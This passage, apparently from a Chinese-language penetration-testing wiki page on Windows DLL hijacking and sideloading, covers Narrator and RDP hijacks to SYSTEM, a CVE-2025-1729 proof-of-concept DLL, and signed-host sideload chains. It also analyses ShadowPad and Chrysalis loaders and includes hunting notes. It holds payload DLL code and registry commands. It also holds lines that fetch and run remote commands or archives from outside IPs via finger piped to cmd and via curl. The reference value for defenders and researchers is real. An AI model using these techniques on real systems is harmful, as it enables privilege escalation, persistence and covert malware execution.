- Winlogon/SYSTEM（HKLM）：`reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 使用上述配置后，启动 Narrator 会加载植入的 DLL。在安全桌面（登录屏幕）上，按 CTRL+WIN+ENTER 启动 Narrator；你的 DLL 会以 SYSTEM 身份在安全桌面上执行。

由 RDP 触发的 SYSTEM 执行（横向移动）
- 启用经典 RDP 安全层：`reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- 通过 RDP 连接到主机，在登录屏幕上按 CTRL+WIN+ENTER 启动 Narrator；你的 DLL 会以 SYSTEM 身份在安全桌面上执行。
- RDP 会话关闭后执行即停止——请及时 inject/migrate。

自带 Accessibility（BYOA）
- 你可以克隆内置 Accessibility Tool（AT）的注册表项（例如 CursorIndicator），将其编辑为指向任意二进制文件/DLL，导入后，再将 `configuration` 设置为该 AT 名称。这样便可通过 Accessibility 框架代理执行任意代码。

注意事项
- 在 `%windir%\System32` 下写入文件以及更改 HKLM 值都需要管理员权限。
- 所有 payload 逻辑都可以放在 `DLL_PROCESS_ATTACH` 中；不需要导出函数。

## 案例研究：CVE-2025-1729 - 使用 TPQMAssistant.exe 提权

本案例展示了 Lenovo TrackPoint Quick Menu（`TPQMAssistant.exe`）中的 **Phantom DLL Hijacking**，该漏洞编号为 **CVE-2025-1729**。<sup>[[2]](#references)[[3]](#references)</sup>

### 漏洞详情

- **组件**：位于 `C:\ProgramData\Lenovo\TPQM\Assistant\` 的 `TPQMAssistant.exe`。
- **计划任务**：`Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` 每天上午 9:30 在已登录用户的上下文中运行。
- **目录权限**：`CREATOR OWNER` 拥有写入权限，允许本地用户放置任意文件。
- **DLL 搜索行为**：程序会先尝试从工作目录加载 `hostfxr.dll`；若缺失，则记录 "NAME NOT FOUND"，表明本地目录具有更高的搜索优先级。

### 漏洞利用实现

攻击者可以在同一目录中放置恶意的 `hostfxr.dll` stub，利用缺失的 DLL 在用户上下文中实现代码执行：

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### 攻击流程

1. 以普通用户身份，将 `hostfxr.dll` 放入 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
2. 等待计划任务在上午 9:30 以当前用户的上下文运行。
3. 如果任务执行时有管理员登录，恶意 DLL 会在管理员会话中以中等完整性运行。
4. 链接标准 UAC bypass 技术，从中等完整性提升到 SYSTEM 权限。

## 案例研究：MSI CustomAction Dropper + 通过签名 Host（wsc_proxy.exe）进行 DLL Side-Loading

威胁行为者经常将基于 MSI 的 dropper 与 DLL side-loading 结合起来，在受信任的签名进程下执行 payload。<sup>[[10]](#references)</sup>

链路概览
- 用户下载 MSI。GUI 安装期间，CustomAction 在后台运行（例如 LaunchApplication 或 VBScript action），从嵌入资源中重建下一阶段。
- Dropper 将一个合法的签名 EXE 和一个恶意 DLL 写入同一目录（示例组合：Avast 签名的 wsc_proxy.exe + 攻击者控制的 wsc.dll）。
- 启动签名 EXE 时，Windows DLL 搜索顺序会优先从工作目录加载 wsc.dll，从而在签名父进程下执行攻击者代码（ATT&CK T1574.001）。

MSI 分析（需要检查的内容）
- CustomAction 表：
  - 查找会运行可执行文件或 VBScript 的条目。可疑模式示例：LaunchApplication 在后台执行嵌入文件。
  - 在 Orca（Microsoft Orca.exe）中检查 CustomAction、InstallExecuteSequence 和 Binary 表。
- MSI CAB 中嵌入/拆分的 payload：
  - 管理员提取：msiexec /a package.msi /qb TARGETDIR=C:\out
  - 或使用 lessmsi：lessmsi x package.msi C:\out
  - 查找多个较小的片段，这些片段会由 VBScript CustomAction 拼接并解密。常见流程：

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Practical sideloading with wsc_proxy.exe
- 将以下两个文件放在同一文件夹中：
  - wsc_proxy.exe：合法的已签名宿主（Avast）。该进程会尝试从其所在目录按名称加载 wsc.dll。
  - wsc.dll：攻击者 DLL。如果不需要特定导出函数，DllMain 即可；否则，构建一个 proxy DLL，将所需导出函数转发给正版库，同时在 DllMain 中运行 payload。
- 构建一个最小化 DLL payload：

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- 对于导出要求，使用代理框架（例如 DLLirant/Spartacus）生成转发 DLL，并让它同时执行你的 payload。

- 此技术依赖宿主二进制文件进行 DLL 名称解析。如果宿主使用绝对路径或安全加载标志（例如 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories），DLL hijack 可能会失败。
- KnownDLLs、SxS 和转发导出都可能影响优先级；选择宿主二进制文件和导出集时，必须考虑这些因素。

## 已签名三元组 + 加密 payload（ShadowPad 案例研究）

Check Point 描述了 Ink Dragon 如何使用**三文件组合**部署 ShadowPad，以伪装成合法软件，同时确保核心 payload 在磁盘上保持加密：<sup>[[12]](#references)</sup>

1. **已签名的宿主 EXE** – 滥用 AMD、Realtek 或 NVIDIA 等厂商的程序（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻击者会将可执行文件重命名为看起来像 Windows 二进制文件的名称（例如 `conhost.exe`），但 Authenticode 签名仍然有效。
2. **恶意 loader DLL** – 放在 EXE 旁边，并使用预期的名称（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。该 DLL 通常是使用 ScatterBrain framework 混淆过的 MFC 二进制文件；它唯一的任务是定位加密 blob、将其解密，并以反射方式映射 ShadowPad。
3. **加密的 payload blob** – 通常以 `<name>.tmp` 的形式存放在同一目录中。将解密后的 payload 映射到内存后，loader 会删除 TMP 文件以销毁取证证据。

Tradecraft 注意事项：

* 重命名已签名的 EXE（同时在 PE header 中保留原始的 `OriginalFileName`），可以让它伪装成 Windows 二进制文件，同时保留厂商签名。因此，可以仿照 Ink Dragon 的做法，投放外观像 `conhost.exe`、实则为 AMD/NVIDIA 实用程序的二进制文件。
* 由于可执行文件仍受信任，大多数 allowlisting 控制只要求恶意 DLL 放在它旁边。应重点定制 loader DLL；通常无需修改已签名的父程序。
* ShadowPad 的 decryptor 预期 TMP blob 与 loader 放在一起，并且文件可写，以便映射后将文件内容清零。payload 加载前，应保持目录可写；payload 进入内存后，可以安全删除 TMP 文件以满足 OPSEC 需求。

### LOLBAS stager + 分阶段 archive sideloading 链（finger → tar/curl → WMI）

Operator 会将 DLL sideloading 与 LOLBAS 配合使用，使磁盘上的唯一自定义 artifact 成为放在受信任 EXE 旁边的恶意 DLL：<sup>[[1]](#references)</sup>

- **远程命令加载器 (Finger)：** 隐藏的 PowerShell 启动 `cmd.exe /c`，从 Finger 服务器获取命令，并将其传递给 `cmd`：

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` 会读取 TCP/79 上的文本；`| cmd` 会执行服务器返回的内容，使操作者能够在服务器端轮换第二阶段。

- **内置下载/解压：** 使用无害扩展名下载存档，解压后将 sideload 目标和 DLL 暂存到随机的 `%LocalAppData%` 文件夹中：

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` 隐藏进度信息并跟随重定向；`tar -xf` 使用 Windows 内置的 tar。

- **WMI/CIM launch：** 通过 WMI 启动 EXE，使遥测记录显示该进程由 CIM 创建，同时加载与其位于同一目录的 DLL：

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - 适用于优先使用本地 DLL 的二进制文件（例如 `intelbq.exe`、`nearby_share.exe`）；payload（例如 Remcos）以受信任的名称运行。

- **狩猎：**当 `forfiles` 同时出现 `/p`、`/m` 和 `/c` 时发出警报；这种用法在管理员脚本之外并不常见。


## 案例研究：NSIS dropper + Bitdefender Submission Wizard sideload（Chrysalis）

最近一次 Lotus Blossom 入侵滥用了受信任的更新链，投放一个 NSIS 打包的 dropper，用于部署 DLL sideload 和完全驻留内存的 payload。<sup>[[13]](#references)</sup>

攻击流程
- `update.exe`（NSIS）创建 `%AppData%\Bluetooth`，将其标记为 **HIDDEN**，投放一个改名后的 Bitdefender Submission Wizard `BluetoothService.exe`、恶意 `log.dll` 和加密 blob `BluetoothService`，然后启动该 EXE。
- 宿主 EXE 导入 `log.dll` 并调用 `LogInit`/`LogWrite`。`LogInit` 通过 mmap 加载 blob；`LogWrite` 使用基于自定义 LCG 的流加密算法解密该 blob（常量为 **0x19660D** / **0x3C6EF35F**，密钥材料源自先前的哈希），用明文 shellcode 覆盖缓冲区，释放临时数据，然后跳转到 shellcode。
- 为避免使用 IAT，loader 通过哈希导出名称来解析 API：先使用 **FNV-1a basis 0x811C9DC5 + prime 0x1000193**，再应用 Murmur 风格的雪崩混合（**0x85EBCA6B**），并与加盐后的目标哈希进行比较。

主 shellcode（Chrysalis）
- 对类似 PE 的主模块进行解密：在五轮处理中重复执行加法/XOR/减法，使用的密钥为 `gQ2JR&9;`，然后动态加载 `Kernel32.dll` → `GetProcAddress` 以完成导入解析。
- 通过逐字符的位旋转/XOR 转换在运行时重建 DLL 名称字符串，然后加载 `oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32`。
- 使用第二个解析器遍历 **PEB → InMemoryOrderModuleList**，以 4 字节为块解析每个导出表并进行 Murmur 风格混合；仅当未找到哈希时才回退到 `GetProcAddress`。

嵌入式配置与 C2
- 配置位于已投放的 `BluetoothService` 文件中，偏移为 **0x30808**（大小 **0x980**），使用密钥 `qwhvb^435h&*7` 进行 RC4 解密，可提取出 C2 URL 和 User-Agent。
- Beacon 会构造以点分隔的主机配置文件，添加前缀标签 `4Q`，然后使用密钥 `vAuig34%^325hGV` 进行 RC4 加密，再通过 HTTPS 调用 `HttpSendRequestA`。响应会经过 RC4 解密，并根据标签进行分发（`4T` shell、`4V` 进程执行、`4W/4X` 文件写入、`4Y` 读取/外传、`4\\` 卸载、`4` 驱动器/文件枚举及分块传输相关操作）。
- 执行模式由 CLI 参数控制：无参数 = 安装持久化（service/Run key）并指向 `-i`；`-i` 使用 `-k` 重新启动自身；`-k` 跳过安装并运行 payload。

观察到的备用 loader
- 同一次入侵还投放了 Tiny C Compiler，并在 `C:\ProgramData\USOShared\` 中执行 `svchost.exe -nostdlib -run conf.c`，旁边放置 `libtcc.dll`。攻击者提供的 C 源代码嵌入了 shellcode，可在内存中编译并运行，整个过程不会在磁盘上写入 PE 文件。可通过以下方式复现：

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- 这个基于 TCC 的编译并运行阶段在运行时导入 `Wininet.dll`，并从硬编码的 URL 获取第二阶段 shellcode，从而实现一个灵活的 loader，伪装成编译器运行。

## Signed-host sideloading with export proxying + host thread parking

某些 DLL sideloading 链会加入**稳定性工程**，确保合法宿主进程能够持续运行，足以顺利加载后续阶段，而不是在恶意 DLL 加载后崩溃。<sup>[[11]](#references)</sup>

观察到的模式
- 将受信任的 EXE 与恶意 DLL 放在同一目录，并使用预期的依赖项名称，例如 `version.dll`。
- 恶意 DLL 将**所有预期导出函数都代理**到真实的系统 DLL（例如 `%SystemRoot%\\System32\\version.dll`），确保导入解析仍能成功，且宿主进程继续运行。
- 加载后，恶意 DLL **修补宿主的入口点**，使主线程进入无限 `Sleep` 循环，而不是退出或执行会终止进程的代码路径。
- 新线程负责执行真正的恶意操作：解密下一阶段 DLL 的名称或路径（常见方式包括 RC4/XOR），然后使用 `LoadLibrary` 加载它。

重要性
- 常规 DLL 代理可以保持 API 兼容性，但不能保证宿主进程会持续运行到后续阶段加载完成。
- 让主线程停留在 `Sleep(INFINITE)` 中，是一种简单的方法，可以在 loader 通过工作线程执行解密、暂存或网络引导时，让已签名进程继续驻留。
- 如果只搜寻可疑的 `DllMain`，可能会漏掉这种模式，因为关键行为发生在宿主入口点被修补、辅助线程启动之后。

最简工作流
1. 复制已签名的宿主 EXE，并确定它会从本地目录解析哪个 DLL。
2. 构建一个导出相同函数、并将这些函数转发到合法 DLL 的代理 DLL。
3. 在 `DllMain(DLL_PROCESS_ATTACH)` 中创建一个工作线程。
4. 从该线程修补宿主入口点或主线程启动例程，使其循环调用 `Sleep`。
5. 解密下一阶段 DLL 的名称/配置，并调用 `LoadLibrary` 或对 payload 进行 manual-map。

防御排查方向
- 已签名进程从自身应用程序目录而非 `System32` 加载 `version.dll` 或类似的常见库。
- 映像加载后不久，进程入口点出现内存补丁，尤其是跳转/调用被重定向到 `Sleep`/`SleepEx` 的情况。
- 代理 DLL 创建的线程立即对名称经过解密的第二个 DLL 调用 `LoadLibrary`。
- 完整导出代理 DLL 与供应商可执行文件一同放置在可写暂存目录中，例如 `ProgramData`、`%TEMP%` 或解压后的归档路径。

## References

- [1] [Red Canary – 情报洞察：2026 年 1 月](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - 使用 TPQMAssistant.exe 进行权限提升](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT：DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows 中的 DLL hijacking：简单的 C 示例。](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore 部署针对欧洲的新型恶意软件](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility：当 DLL Hijack 遇上 Windows 辅助工具](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – 数字 Doppelganger：分发 Gh0st RAT 的演变中冒充活动剖析](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – 利益交汇：针对东南亚某政府的威胁集群分析](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – 深入 Ink Dragon：揭示隐蔽攻击行动的中继网络与内部运作机制](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor：深入剖析 Lotus Blossom 的工具包](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack 链](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – 追踪伊朗 APT Screening Serpens 的 2026 年间谍活动](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` 元素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` 元素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` 元素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` 元素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` 元素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` 元素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – 速度与激情：伊朗冲突期间的 Nimbus Manticore 行动](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – 任务操作](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 针对东南亚各国政府和关键基础设施](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Microsoft Learn – PE 格式](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [27] [FortiGuard Labs – 揭露嵌入合法软件中的 SectopRAT 变种](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
{{#include ../../../banners/hacktricks-training.md}}
